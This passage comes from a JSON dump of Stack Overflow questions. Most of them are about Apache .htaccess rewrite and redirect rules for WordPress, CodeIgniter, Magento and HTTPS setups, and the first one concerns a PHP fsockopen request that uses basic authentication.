\".base64_encode(\"$HtaccessUser:$HtaccessPass\").\"\\r\\n\";\n$Get .= \"\\r\\n\";\n$fpHttp = fsockopen($Domain, 80, $errno, $errstr);\nfputs($fpHttp, $Get);\nwhile($fpHttp !== false &amp;&amp; !feof($fpHttp))\n{   $Line = fgets($fpHttp, 64);\n    print $Line;\n}\nfclose($fpHttp);\n</code></pre>\n\n<p>This works fine for domains with no htaccess-authorization: It prints the lines almost in \"real-time\". But for domains with htaccess-authorization, nothing is happening, except that the local script stops after some time just with \"http-request failed\", although the server-script is executed.</p>\n\n<p>I suppose that some kind of timeout is happening here.</p>\n\n<p>Looking at the network-traffic, the answers are received correctly in small parts, but PHP just doesn't print them.</p>\n\n<p>Any idea about that why this only happens on pages with htaccess-authorization? Using PHP 5.3.15 on Windows 7.</p>\n"},{"tags":[".htaccess","url","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12691323,"title":"How to rewrite URL like this http://localhost/gestor_3.0/index.php?p=cadastros&t=operadoras","body":"<p>How to rewrite URL like this</p>\n\n<pre><code>http://localhost/gestor_3.0/index.php?p=cadastros&amp;t=operadoras\n</code></pre>\n\n<p>to</p>\n\n<pre><code>http://localhost/gestor_3.0/cadastros/operadoras\n</code></pre>\n\n<p>using htaccess and mod_rewrite.</p>\n"},{"tags":[".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":5,"score":0,"question_id":12690550,"title":"htaccess redirect issue MMXII b","body":"<p>I had a subdomain pointing to a third party blog (tumblr), but I've now migrated the blog to the site. However there's a number of pages which are on Google etc which point to old blogsubdomain.mysite.com pages.</p>\n\n<p>You can't (or don't seem to be able to) point CNAME Records to a directory, e.g. /blog.</p>\n\n<p>I have removed the CNAME record so it's not still pointing at Tumblr in order that my server can redirect traffic.</p>\n\n<p>After trying a number of rules in htaccess without success (although having rules which work perfectly so I know RewriteEngine on), I've gone for:\nRewriteRule ^post/(.?)/([0-9][0-9][0-9][0-9])-([0-9][0-9])-([0-9][0-9])-(.?)$ <a href=\"http://mysite.com/blog\" rel=\"nofollow\">http://mysite.com/blog</a> [R=301,L</p>\n\n<p>Essentially this should redirect ANY url with mysite.com...post/ to mysite/blog. It's a bit blunt force, but all that's really need. If I wanted it to be really nice I could name all posts the same but strip out Tumblr's post number... but this isn't working :(</p>\n\n<p>What is working is that if I type blogsubdomain.mysite.com it does go to mysite.com, however all blogsubdomain.mysite.com/post/123456/etc get:</p>\n\n<p>Not Found</p>\n\n<p>The requested URL /post/123456/etc was not found on this server.</p>\n"},{"tags":["wordpress",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":12689979,"title":"Redirect requests to all urls but one with .htaccess","body":"<p>I have a website with only a wordpress(let's call it blog) application in it. I now need to add another web app(let's call it portfolio) to the same domain and will move the blog to site.com/blog. The user will be able to choose which one to visit on the splash page. So basically I will have the following structure:</p>\n\n<pre><code>site.com -&gt; splash page\nsite.com/blog\nsite.com/portfolio\n</code></pre>\n\n<p>The thing is, I don't want to break the existing links across the web to the blog posts and want to 301 redirect all requests that are not for /portfolio to the blog app, for example:</p>\n\n<pre><code>site.com/about_me redirects to site.com/wordpress/about_me but\nsite.com/portfolio/index doesn't get redirected.\n</code></pre>\n\n<p>I guess it's done inside the .htaccess file but after much reading couldn't get it to work.</p>\n"},{"tags":[".htaccess","mod-rewrite","ssl","https","subfolder"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12679868,"title":"Mod re-write on sub folder","body":"<p>I'm trying to mod re-write to a specific sub folder called /checkout this has an SSL certificate attached for https</p>\n\n<p>So I have this in the root folder of my site -</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\nRewriteCond %{SCRIPT_FILENAME} !-d\nRewriteCond %{SCRIPT_FILENAME} !-f\n\n# in http: force secure.html to https\nRewriteCond %{server_port} !=443\nRewriteCond $1 ^([^/]+)$ [NC]\n# this kinda works below but is resolving to index2.php and is showing in the url so not really working yet\nRewriteRule checkout/([^/]+)\\.html$ https://mysite.com/checkout/index2.php [L] \n</code></pre>\n\n<p>Except that instead of showing something like</p>\n\n<p><a href=\"https://mysite.com/checkout/index.html\" rel=\"nofollow\">https://mysite.com/checkout/index.html</a></p>\n\n<p>it shows</p>\n\n<p><a href=\"https://mysite.com/checkout/index2.php\" rel=\"nofollow\">https://mysite.com/checkout/index2.php</a></p>\n\n<p>(index2.php is a test url btw)</p>\n\n<p>I've also tried amending the .htaccess in the sub folder to to something like</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\nRewriteCond %{SCRIPT_FILENAME} !-d\nRewriteCond %{SCRIPT_FILENAME} !-f\n\nRewriteCond %{server_port} !=443\nRewriteCond $1 ^([^/]+)$ [NC]\nRewriteRule ^([^/\\.]+)/?$ https://mysite.com/checkout/index2.php [L]\n</code></pre>\n\n<p>I just want to process </p>\n\n<p><code>https://mysite.com/checkout/index.html</code> or <code>https://mysite.com/checkout/about-us.html</code> as the same I would in the root like this\n<code>https://mysite.com/index.html</code> => <code>https://mysite.com/index.php</code> (and then get the variables etc)</p>\n\n<p>ie</p>\n\n<pre><code> RewriteRule ^/?(catalogue-page)/([0-9]+)/([0-9]+)/([0-9]+)/([0-9]+)/([0-9]+) index2.php?friendly_url=$1&amp;catalogue_id=$2&amp;view=catalogue&amp;categoryid=$3&amp;subcategoryid=$4&amp;subjectid=$5&amp;item=$6\n</code></pre>\n\n<p>I think that https is more complex.\nAny pointers/help etc much appreciated</p>\n"},{"tags":[".htaccess","pagespeed"],"answer_count":4,"favorite_count":2,"up_vote_count":11,"down_vote_count":0,"view_count":29391,"score":11,"question_id":3641197,"title":"How to Specify \"Vary: Accept-Encoding\" header in .htaccess","body":"<p>Google PageSpeed says I should \"Specify a Vary: Accept-Encoding header\" for JS and CSS. How do I do this in .htaccess?</p>\n"},{"tags":[".htaccess","magento","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12684334,"title":"Unable to access sub directories / folders with Magento installed at root?","body":"<p>I installed Magento at the root of my domain and I'm trying to install a forum to the sub folder at mydomain.com/forum/ but it seems the .htaccess of Magento (located at mydomain.com/.htaccess of course) is preventing any requests to the sub-directory /forum/.</p>\n\n<p>Whenever I access /forum/ or /anything it just gives 404 error instead of serving the actual files located there.</p>\n\n<p>Any idea I can fix this without breaking the URL rewriting for Magento? It's very annoying....</p>\n\n<p>Thank you!</p>\n"},{"tags":[".htaccess","mod-rewrite","joomla","joomla2.5","http-status-code-301"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12326212,"title":"How to redirect in .htacces &Itemid=x to &Itemid=Y","body":"<p>Hello I have this issue</p>\n\n<p>I cant redirect this\nindex.php?option=com_adsmanager&amp;view=list&amp;catid=8&amp;Itemid=435\nTo this\nindex.php?option=com_adsmanager&amp;view=list&amp;catid=8&amp;Itemid=565</p>\n\n<p>catid=8 is a variable i need redirect all the catid= values </p>\n\n<p>Im only need to chanche &amp;Itemid=435 to &amp;Itemid=565</p>\n\n<p>I have this code</p>\n\n<pre><code>   RewriteEngine on\n    RedirectMatch 301 ^(.+)\\&amp;Itemid=435$ $1&amp;Itemid=565\n</code></pre>\n\n<p>I dont know what is wrong\nI need all the urls anything&amp;Itemid=435 goes to sameanything&amp;Itemid=565</p>\n"},{"tags":[".htaccess","redirect","https"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12676242,"title":"Redirect Specific Page to HTTPS Using .htaccess","body":"<p>I'm trying to use .htaccess to redirect: <a href=\"http://shop.mysite.com/products/product-1\" rel=\"nofollow\">http://shop.mysite.com/products/product-1</a> to <a href=\"https://shop.mysite.com/products/product-1\" rel=\"nofollow\">https://shop.mysite.com/products/product-1</a> using .htaccess.  The only difference is the last part of the URL, the product name. I only want the redirect to be in affect for the products pages, nothing else.</p>\n\n<p>Any tips?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12687599,"title":".htaccess redirect both http:// with and without www and https://www to https:// non-www","body":"<p>I'm looking to redirect all of:</p>\n\n<pre><code>http://\nhttp://www.\nhttps://www.\n\nto https://\n</code></pre>\n\n<p>This may have been answered here before, but having gone through the questions that seem relevant they are all not quite what I'm after, and everything I've tried resulted in a redirect loop or not working as hoped.</p>\n\n<p>For example:</p>\n\n<pre><code>RewriteCond %{HTTPS} off\nRewriteCond %{HTTP_HOST} ^www.energenie4u.co.uk\nRewriteRule ^(.*)$ https://energenie4u.co.uk/$1 [R=301,L]\n\nRewriteCond %{HTTPS_HOST} ^www.energenie4u.co.uk\nRewriteRule ^(.*)$ https://energenie4u.co.uk/$1 [R=301,L]\n</code></pre>\n\n<p>Thanks in advance for your help.</p>\n"},{"tags":["php","wordpress",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12686967,"title":"Wordpress wp_rewrite","body":"<p>I am making a Wordpress plugin that imports products with JSON.</p>\n\n<p>I added a RewriteRule in my .htaccess file:</p>\n\n<pre><code>RewriteRule ([/]{0,1}vara-produkter)/([_0-9a-zA-Z-/]{0,}) index.php?pagename=vara-produkter&amp;product=produkter/$2 [L]\n</code></pre>\n\n<ul>\n<li>\"vara-produkter\" is the Wordpress page that will show the products. </li>\n<li>$_GET['product'] variable will contain a string \"produkter\",\n\"produkter/bergvarme\", and so on.</li>\n</ul>\n\n<p>This works, problem is that I would like to do this with PHP and wp_rewrite instead, because \"vara-produkter\" may change, but I cant find out how to even start. Anyone who have examples or a simple solution?</p>\n"},{"tags":["php",".htaccess","session"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":111,"score":4,"question_id":12599533,"title":"PHP Sessions disappear on htaccess redirect condition - In Chrome only","body":"<p>My project hangs on this single issue.</p>\n\n<p>I have this code in my htaccess to implement a flat url system</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine on\nRewriteBase /\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_URI} !^/page.php\nRewriteRule (.*) page.php?pid=$1 [QSA]\n</code></pre>\n\n<p>While this code exists I cannot access session variables created on one page on any other page. Even if the pages are static .php pages that do not go through the redirection the sessions disappear. ONly this code somehow prevents sessions. </p>\n\n<p>I have set session cookie path and domain to make sure the realm is correct, but it does not work. </p>\n\n<p>Any help will be appreciated from the bottom of my heart. </p>\n\n<p>The funny thing is it only fails on Chrome. </p>\n"},{"tags":["php","apache",".htaccess","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":132,"score":2,"question_id":12682610,"title":"Codeigniter remove index.php while working on virtual host on xampp","body":"<p>My previous folder tree was (with portable xampp): (for example working on D: drive root)</p>\n\n<pre><code>/xampp/htdocs/application\n/xampp/htdocs/system\n/xampp/htdocs/themes\n/xampp/htdocs/index.php etc..\n</code></pre>\n\n<p>Now I am trying to shift into a structure which I can work with multiple projects so new tree:</p>\n\n<pre><code>/xampp/htdocs\n/web_projects/project-name/codeigniter/application\n/web_projects/project-name/codeigniter/system\n/web_projects/project-name/htdocs/themes\n/web_projects/project-name/htdocs/index.php\n</code></pre>\n\n<p>My <strong>htaccess</strong> file in htdocs:</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond $1 !^(index\\.php|robots\\.txt)\n\n# if Serves works on Linux OS\nRewriteRule ^(.*)$ index.php/$1\n\n# if Server works on Windows OS\n# RewriteRule ^(.*)$ index.php?/$1\n\nRewriteCond %{REQUEST_FILENAME} !-f\n\n# if Serves works on Linux OS\nRewriteRule ^(application|modules|plugins|system|themes|library|files) index.php/$1 [L]\n\n# if Server works on Windows OS\n# RewriteRule ^(application|modules|plugins|system|themes|library|files) index.php?/$1 [L]\n</code></pre>\n\n<p>And <strong>httpd-vhosts.conf</strong>:</p>\n\n<pre><code>NameVirtualHost *:8080\n\n&lt;VirtualHost *:8080&gt;\n    DocumentRoot \"/xampp/htdocs\"\n    ServerName localhost\n    &lt;Directory \"/xampp/htdocs\"&gt;\n        Order allow,deny\n        Allow from all\n    &lt;/Directory&gt;\n&lt;/VirtualHost&gt;\n\n&lt;VirtualHost *:8080&gt;\n    DocumentRoot \"/web_projects\"\n    ServerName welcome.localhost\n    &lt;Directory \"/web_projects\"&gt;\n        Order allow,deny\n        Allow from all\n    &lt;/Directory&gt;\n&lt;/VirtualHost&gt;\n\n&lt;VirtualHost *:8080&gt;\n    DocumentRoot \"/web_projects/test/htdocs\"\n    ServerName test.localhost\n    &lt;Directory \"/web_projects/test/htdocs\"&gt;\n        Order allow,deny\n        Allow from all\n    &lt;/Directory&gt;\n&lt;/VirtualHost&gt;\n</code></pre>\n\n<p>Finally <strong>etc/host</strong>:</p>\n\n<pre><code>127.0.0.1 localhost\n127.0.0.1 welcome.localhost\n127.0.0.1 test.localhost\n127.0.0.1 vstart # Alias for test\n</code></pre>\n\n<p>All virtual hosts are working, i.e. <strong>http://vstart:8080/</strong> is working but codeigniter not operates without index.php in address line, so routes are not working in accordance.</p>\n\n<p>My <strong>config/config.php</strong> file is:</p>\n\n<pre><code>$config['base_url'] = ((isset($_SERVER['HTTPS']) &amp;&amp; $_SERVER['HTTPS'] == \"on\") ? \"https\" : \"http\");\n$config['base_url'] .= \"://\".$_SERVER['HTTP_HOST'];\n$config['base_url'] .= str_replace(basename($_SERVER['SCRIPT_NAME']),\"\",$_SERVER['SCRIPT_NAME']);\n\n$config['index_page'] = '';\n</code></pre>\n\n<p>This set was working smoothly in my previous folder tree now is not working. I digged internet to find a solution with failure.</p>\n\n<p>Any outer eyes to catch where I am doing wrong?</p>\n"},{"tags":["wordpress",".htaccess","mod-rewrite","redirect","loops"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":12383336,"title":"Redirect loop from old domain to new subdomain","body":"<p>I have an issue with .htaccess rewrite ruleset. www.OldDomain.com with Joomla template is being retired and new website is a Wordpress based site having address at <a href=\"http://newdomain.com/subfolder\" rel=\"nofollow\">http://newdomain.com/subfolder</a>.</p>\n\n<p>For some reason I get the following message: \"This webpage has a redirect loop\", but whatever I try it doesn't work. The new Wordpress site has url-friendly links generated by wordpress. I tried to upload a default wordpress .htaccess but it doesn't work either.</p>\n\n<p>Can anyone point me in right direction how to solve this issue? Thank you in advance.</p>\n\n<p>The old site was on a different server with the same domain name as the new one.</p>\n\n<p>Current .htaccess file on a domains' new server is as follows:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{HTTP_HOST} ^newdomain\\.com$\nRewriteRule (.*) http://www.newdomain.com/$1 [R=301,L]\nRewriteRule ^$ beta/ [L]\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12349664,"title":"mod_rewrite: How to disable not clean urls navigation of rewrite rules","body":"<p>I've been enabled mod_rewrite module and all is right.</p>\n\n<p>I created simple rules for the url, but how do I disable the url navigation (rewritten) with the parameters?</p>\n\n<p>example:</p>\n\n<pre><code># rewrite rule for cleaning\nRewriteRule ^bookstore/([0-9]+)?$ /bookstore/book.php?id=$1 [L]\n</code></pre>\n\n<p>Now, if I navigate to <a href=\"http://mydomine.com/bookstore/123\" rel=\"nofollow\">http://mydomine.com/bookstore/123</a> all is done, but the url <a href=\"http://mydomine.com/bookstore/book.php?id=123\" rel=\"nofollow\">http://mydomine.com/bookstore/book.php?id=123</a> is also navigable.</p>\n\n<p>How can I make visible and bavigable only the first one?</p>\n"},{"tags":[".htaccess","redirect","rule"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":16,"score":0,"question_id":12686839,"title":"htaccess redirect with on rule","body":"<p>how to write one rule what would satisfy all this redirect what I try to achive with the following rules</p>\n\n<pre><code>RewriteRule ^desktop/page/1/ /tag/desktop/page/1/ [R,L]\nRewriteRule ^desktop/page/2/ /tag/desktop/page/2/ [R,L]\nRewriteRule ^desktop/page/3/ /tag/desktop/page/3/ [R,L]\nRewriteRule ^desktop /tag/desktop [R,L]\n</code></pre>\n\n<p>the last one is never executed</p>\n"},{"tags":["regex",".htaccess","redirect","rule"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12685923,"title":"redirect rule not executed","body":"<p>I have the following redirect rule tested with rubular.com </p>\n\n<pre><code>^tags\\/([a-zA-Z0-9_-]+)\\.html\n</code></pre>\n\n<p>and using as example  <code>/tags/a-led.html</code> is returning <code>/tags/a-led</code>. Till this point everything looks all right but when I apply the rule in my htaccess as it follows</p>\n\n<pre><code> RewriteRule ^tags\\/([a-zA-Z0-9_-]+)\\.html$  /tags/$1 [R,L]\n</code></pre>\n\n<p>and some other rules are after</p>\n\n<pre><code>RewriteRule ^(.*)/(d*)-(.*)\\.html$  /showthread.php?$1 [R,L]\nRewriteRule ^(d*)-(.*)\\.html$ /threads/$2 [R,L]\n</code></pre>\n\n<p>is not getting executed and unfortunately I don't have a glue what could be the reason.</p>\n"},{"tags":[".htaccess","cakephp","controller","url-routing"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12670573,"title":"CakePHP branch routing","body":"<p>I am trying to test some new features on a live site.</p>\n\n<p>My goal is to have a prefix ('dev', for example) and have that prefix display the complete site with default actions, except those I define as dev_{action_name}.</p>\n\n<p>Example:</p>\n\n<pre><code>/dev/orders/create\n</code></pre>\n\n<p>Seeks for OrdersController::dev_create() action, if not found, uses OrdersController::create().</p>\n\n<p>So far, I managed to make a standard 'dev' prefix with the Router and put some beforeFilter magic like:</p>\n\n<pre><code>&lt;?php\n//bootstrap.php code:\nConfigure::write('Routing.prefixes', array('admin', 'dev'));\n\n// AppController::beforeFilter() code:\nif (preg_match('/^dev_(.*)$/', $this-&gt;params['action'], $subs)){\n   $new_action = $subs[1];\n   if (method_exists($this, $new_action)){\n          $this-&gt;params['action'] = $new_action;\n    } \n}\n?&gt;\n</code></pre>\n\n<p>This works as expected, except the complete Routing schema is not copied to \"dev\", which means all the links are rendered without the \"dev prefix and my custom routes are disregarded.</p>\n\n<p>I thought about fixing it with .htaccess rule and putting a dev=true in the query string:</p>\n\n<pre><code>#webroot/.htaccess\nRewriteRule ^dev(.*)$ index.php?dev=true&amp;%{QUERY_STRING}\n#... rewrite conds ...\nRewriteRule ^(.*)$ index.php [QSA,L] #original Cake rewrite\n</code></pre>\n\n<p>But this yielded no results (Cake was still parsing the original URL, not the re-written).</p>\n\n<p>Is there a \"right\" way of doing this?</p>\n"},{"tags":["javascript","internet-explorer",".htaccess","redirect"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12684707,"title":"Detect all browsers except IE?","body":"<p>Is there a way to detect all browsers but IE for a redirect with either HTAccess or Javascript? Something like if not IE, redirect to site.com?</p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12685448,"title":"URL rewrite, preserve natural paths","body":"<p>I'm writing a default .htaccess for a system that runs multiple JS app packages. I want to have URL rewrites that forward to run of these apps from the root (i.e. if the system is included at <em>www/</em>, <em>www/appname/</em> should forward to <em>server.index.php?app=appname</em>).</p>\n\n<p>Here's roughly what I have now (I'll skip the other stuff in my .htaccess).</p>\n\n<pre><code>RewriteRule ^use/?([^/]*)/?([^/]*)/?([^/]*)/? \\server/index.php?app=$1&amp;servable=$2&amp;action=$3\nRewriteRule ^web/?([^/]*)/? \\server/index.php?servable=clients&amp;action=web&amp;app=$1\n</code></pre>\n\n<p>As you can see, I'm currently using two endpoints: <em>use</em> forwards to any action in the backend, while <em>web</em> forwards to the action that actually serves the application itself as an HTML document. <strong>I basically want to skip the <em>web/</em> prefix in the URL in the latter case, but without hindering access to natural directories that already exist in the system's directory.</strong></p>\n\n<p>Here's <a href=\"https://bitbucket.org/Eiskis/proot/src/3f46120eae37/.htaccess\" rel=\"nofollow\" title=\"full source\">full source</a>. (As you can see there are probably other issues with my .htaccess as well, so if you have any pointers I'm happy to fix them.)</p>\n"},{"tags":["mvc",".htaccess","mod-rewrite","url-rewriting","rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":21,"score":1,"question_id":12681260,"title":"RewriteRule Appending Query for Existing Directories","body":"<p>I'm implementing an MVC pattern for my new PHP site with a URL structure like the following:</p>\n\n<pre><code>example.com/module/controller/action?params=...\n</code></pre>\n\n<p>Here is my .htaccess file:  </p>\n\n<pre><code>Options -Indexes\n\nRewriteEngine on\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^(.*) portal.php?mvc=$1 [QSA,L]\n</code></pre>\n\n<p>The rules are working mostly right, however, if I have a directory in the public space with the same name as a module, it appends <code>?mvc=[directory name]</code> to the end of the URL if there is no trailing slash.  </p>\n\n<p>For example:<br>\n<code>example.loc/index</code> turns into <code>example.loc/index/?mvc=index</code><br>\nbut <code>example.loc/index/</code> stays the same.</p>\n\n<p>How can I make it so that if the user types in <code>example.loc/index</code> it has the same behavior as if they had included the ending slash?</p>\n"},{"tags":[".htaccess","variables","mod-rewrite","rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12270227,"title":".htaccess url rewrite with filter url variables","body":"<p>I'm trying to do some custom url rewriting with .htaccess file but I'm getting no luck.</p>\n\n<p>We have a filter on the manufacturer page and when it changes it adds the category to the end of the url and gets the manufacturer products in that category, our current url looks like this:\n<a href=\"https://www.domain.com/manufacturername?category=72\" rel=\"nofollow\">https://www.domain.com/manufacturername?category=72</a></p>\n\n<p>I would like the url to look like this:\n<a href=\"https://www.domain.com/manufacturername-categoryname\" rel=\"nofollow\">https://www.domain.com/manufacturername-categoryname</a></p>\n\n<p>I can't seem to figure out why it dosen't work (does a 404 error). Is it possible to do the above? How do you get the variable for category is it just a php get request? My htaccess code is below</p>\n\n<pre><code>RewriteBase /\n\nRewriteRule sitemap.xml /index.php?route=feed/google_sitemap\n\nRewriteCond %{REQUEST_FILENAME} !-f\n\nRewriteCond %{REQUEST_FILENAME} !-d\n\nRewriteRule ^([^?]*) index.php?_route_=$1 [L,QSA]\n</code></pre>\n"},{"tags":["html","apache",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12683919,"title":"base href causing this?","body":"<p>Hi I have a spip website that I need to get working on my localmachine.</p>\n\n<p>I copied everything over and the site seems to be \"working\" with all the databases. </p>\n\n<p>The problem is I think there is a base href set. </p>\n\n<p>The stylesheet in the header was linked like this:</p>\n\n<pre><code>&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"/css/style.css\" /&gt;\n</code></pre>\n\n<p>and was not working as it was going to the root of the localhost instead of the website folder. </p>\n\n<p>However changing the link to this (without the forward slash) works perfectly.</p>\n\n<pre><code>&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"css/style.css\" /&gt;\n</code></pre>\n\n<p>The problem is I have tons of links on the site that are all acting like this. Is there anywhere I can look to see what is causing this? I can't find a base href set anywhere and the htaccess file seems to have no effect. </p>\n"},{"tags":["php",".htaccess","mod-rewrite","url-rewriting","wampserver"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12676497,"title":"Remove in between folder structure from the url in a php website","body":"<p>I have a php website having following folder structure (basic structure).</p>\n\n<ul>\n<li>project_name\n<ul>\n<li>app\n<ul>\n<li>controller</li>\n<li>model</li>\n<li>view</li>\n</ul></li>\n<li>css</li>\n<li>js</li>\n<li>img</li>\n<li>index.php</li>\n</ul></li>\n</ul>\n\n<p>So when I view index.php in WAMP the url is <code>http://localhost/project_name/</code></p>\n\n<p>But when I go inside the site (eg. login.php which resides under view folder) url is like this. <code>http://localhost/project_name/app/view/login.php</code></p>\n\n<p>I found that using .htaccess we can change the urls. So I tried this (in .htaccess).</p>\n\n<pre><code>RewriteEngine on\nRewriteBase /\nRedirect 301 /project_name/app/view/login.php /project_name/login.php\nRewriteRule ^/project_name/login.php$ /project_name/app/view/login.php [L]\n</code></pre>\n\n<p>Now url is <code>http://localhost/project_name/login.php</code> It is correct. But it seems php does not use the original link to grab the file (ie. from <code>/project_name/app/view/login.php</code>) but from here <code>/project_name/login.php</code></p>\n\n<p>So it throws 404 error. </p>\n\n<p>What should I change? Please help me, i am just trying to hide <code>/app/view/</code> part from the url so that user won't see my folder structure. I have read about various ways of doing that for about 9hrs today but still couldn't get anything working correctly.</p>\n\n<p>Hope my question is clear enough. Any help is greatly appreciated!</p>\n"},{"tags":["wordpress",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12682355,"title":"Redirect 301 in .htaccess not accepting slash","body":"<p>I've got a WordPress blog that I'm trying to redirect to a new domain.  The 301 redirect works, but it redirects to newdomain.comnew-post instead of newdomain.com/new-post.</p>\n\n<p>Somehow, it's stripping out the slash.  Here's the code:</p>\n\n<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n\n# END WordPress\n\nRedirect 301 /old-post/ http://www.newdomain.com/new-post/\n</code></pre>\n\n<p>What am I missing?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":10,"score":0,"question_id":12682302,"title":"mod_rewrite rules for Wordpress upload path","body":"<p>I'm converting a site over from Wordpress to a custom CMS and I'm trying to figure out how to handle all of the image paths that are within posts.</p>\n\n<p>The URL structure is <a href=\"http://site.com/wp-content/uploads/2012/09/image-name.jpg\" rel=\"nofollow\">http://site.com/wp-content/uploads/2012/09/image-name.jpg</a></p>\n\n<p>I need to get it in the form of <a href=\"http://site.com/uploads/image-name.jpg\" rel=\"nofollow\">http://site.com/uploads/image-name.jpg</a></p>\n\n<p>This is what I've got so far:</p>\n\n<pre><code>RewriteRule ^wp-content/uploads/([0-9-])/([0-9-])/([A-Za-z0-9-_]+)/?$ uploads/$3 [R=301,L]\n</code></pre>\n\n<p>It doesn't seem to be working though, what am I doing wrong?</p>\n"},{"tags":["php","wordpress",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12680560,"title":"Htaccess issue with installing php script in WordPress directory","body":"<p>My root directory has a wordpress install in it.  I added a folder called 'jobs' and put a php script in it.  When I access mysite.com/jobs, it works.. but when I drill down below that, such as trying to access mysite.com/jobs/parttime/miami   -- that's when it defaults to the wordpress 404 page.  </p>\n\n<p>I've been searching for the right answer here, but can't seem to make anything work.  </p>\n\n<p>.htaccess</p>\n\n<pre><code> # BEGIN WordPress \n&lt;IfModule mod_rewrite.c&gt; \nRewriteRule ^jobs - [L] \nRewriteEngine On \nRewriteBase / \nRewriteRule ^index\\.php$ - [L] \nRewriteCond %{REQUEST_FILENAME} !-f \nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L] \n&lt;/IfModule&gt; \n# END WordPress\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":10,"score":0,"question_id":12681193,"title":"Redirect subdirectory to subdomain","body":"<p>I am looking to move <code>http://domain.com/blog</code> to <code>http://blog.domain.com</code>.This also means that everything that trails <code>/blog</code> for example <code>/blog/post/1</code> will need to be routed to <code>http://blog.domain.com/post/1</code>. </p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":311,"score":1,"question_id":7818617,"title":"RewriteRule for 301 redirect","body":"<p>I went through all the answered threads on rewrite rule problem. Tried the suggestions, But I still don't know what I am doing wrong. </p>\n\n<p>I want to make a 301 redirect of our old URLs to the new ones. Example: </p>\n\n<pre><code>old url : http://www.xyz.com/abc/topics.html\nnew url : http://www.xyz.com/index.php#first\n</code></pre>\n\n<p>I am trying following rule in .htaccess:</p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^\\/abc\\/(.+)$ http://www.xyz.com/index.php#first [L,R=301]\n</code></pre>\n\n<p>Any advice is highly appreciated</p>\n"},{"tags":["apache",".htaccess","redirect","subdomains"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12679155,"title":"Apply .htaccess Redirect to ALL Subdirectories to www version of site","body":"<p>In my main <code>.htaccess</code> file in the root of my domain, I have the following code:</p>\n\n<pre><code>RewriteEngine on\n# If missing 'www'\nRewriteCond %{http_host} ^example.com [nc]\n# Redirect to 'www' version\nRewriteRule ^(.*)$ http://www.example.com/$1 [R=301,nc]\n# Remove 'index.php' from URL \nRewriteRule ^index.php$ http://www.example.com/ 